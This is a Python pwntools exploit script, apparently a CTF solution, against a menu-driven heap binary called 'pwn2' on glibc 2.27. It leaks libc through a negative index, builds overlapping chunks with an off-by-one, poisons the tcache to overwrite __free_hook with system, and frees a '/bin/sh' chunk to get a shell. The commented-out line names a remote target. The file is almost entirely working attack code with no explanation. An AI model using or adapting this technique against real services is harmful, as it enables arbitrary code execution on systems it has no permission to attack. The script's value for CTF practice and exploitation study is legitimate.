#coding:utf8
from pwn import *

sh = process('./pwn2')
# sh = remote('113.201.14.253',16066)
context.terminal = ["/bin/tmux", "sp",'-h']
libc = ELF('/home/yrl/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc.so.6')
dbg = lambda text=None  : gdb.attach(sh, text)
def add(size,content):
   sh.sendlineafter('Choice:','1')
   sh.sendlineafter('size:',str(size))
   sh.sendafter('content:',content)

def edit(index,content):
   sh.sendlineafter('Choice:','2')
   sh.sendlineafter('idx:',str(index))
   sh.sendafter('content:',content)

def delete(index):
   sh.sendlineafter('Choice:','3')
   sh.sendlineafter('idx:',str(index))

def show(index):
   sh.sendlineafter('Choice:','4')
   sh.sendlineafter('idx:',str(index))

show(-0x11)
sh.recv(1)
libc_base = u64(sh.recv(6).ljust(8,'\x00')) - libc.sym['_IO_2_1_stderr_']
free_hook = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']
print 'libc_base=',hex(libc_base)

context.log_level = 'debug'
add(0xF0,'a'*0xF1) #0
add(0x80,'b'*0x81) #1
add(0xF0,'c'*0xF1) #2

for i in range(7):
   add(0xF0,'d'*0xF1)

for i in range(3,10):
   delete(i)

delete(0)
delete(1)
add(0x88,'b'*0x80 + p64(0x90 + 0x100) + '\n') #0
delete(0)

dbg()
delete(2)
pause()
add(0x110,'a'*0xF0 + p64(0) + p64(0x81) + p64(free_hook) + '\n') #0

add(0x80,'/bin/sh\x00\n') #1
add(0x80,p64(system_addr) + '\n') #2


delete(1)

sh.interactive()
